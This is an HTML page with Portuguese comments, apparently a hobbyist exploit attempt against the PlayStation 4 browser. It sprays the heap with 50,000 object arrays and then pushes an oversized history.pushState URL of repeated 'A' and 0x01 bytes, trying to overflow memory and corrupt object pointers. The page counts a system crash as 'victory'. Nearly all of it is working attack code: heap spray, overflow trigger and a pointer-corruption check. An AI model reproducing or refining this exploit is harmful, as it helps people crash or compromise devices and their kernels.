<!DOCTYPE html>
<html>
<head>
    <title>PS4 Pointer Poisoning Test</title>
    <style>
        body { background-color: #220000; color: #ff9999; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #ff0000; background: #000; color: #fff; font-weight: bold;
        }
        #log { border: 1px solid #555; background: #111; padding: 10px; height: 300px; overflow-y: scroll; text-align: left; }
    </style>
</head>
<body>

    <h1>Teste de Veneno (Pointer Poisoning)</h1>
    <p>Vamos tentar corromper ponteiros de objetos. Se funcionar, o console VAI TRAVAR.</p>

    <button onclick="runPoison()">DISPARAR VENENO</button>
    
    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 128; // 128KB de excesso

        var victims = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += msg + "<br>";
            el.scrollTop = el.scrollHeight;
        }

        function runPoison() {
            log("1. Alocando Arrays de Objetos...");

            setTimeout(() => {
                try {
                    // SPRAY: Criamos arrays que contêm referências a objetos
                    // Arrays de Objetos usam memória de forma diferente de Uint32Array
                    const SPRAY_NUM = 50000;
                    
                    for (let i = 0; i < SPRAY_NUM; i++) {
                        // Um array pequeno com um objeto dentro
                        // Se corrompermos isso, o ponteiro para o objeto vira lixo
                        let arr = [{id: i}, {val: 0x41414141}]; 
                        victims.push(arr);
                    }

                    log("2. Disparando Overflow...");

                    // Dispara
                    setTimeout(() => {
                        let buffer = "A".repeat(BASE_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "poison", "/" + buffer);

                        log("3. Verificando integridade (Tocando nos objetos)...");
                        checkVitality();

                    }, 500);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 200);
        }

        function checkVitality() {
            // Se o overflow funcionou, algum desses acessos vai tentar ler
            // o endereço de memória 0x01010101 e matar o Kernel.
            
            for (let i = 0; i < victims.length; i++) {
                let v = victims[i];
                
                try {
                    // Tenta acessar uma propriedade do objeto.
                    // Isso força o navegador a seguir o ponteiro.
                    let check = v[0].id; 
                } catch (e) {
                    // Se der erro JS, ok.
                    // Se der Crash de sistema, VITÓRIA.
                }
            }
            log("Sobreviveu... Nenhum ponteiro foi atingido.");
            log("Diagnóstico: Heap Isolation forte ou Spray insuficiente.");
        }
    </script>
</body>
</html>
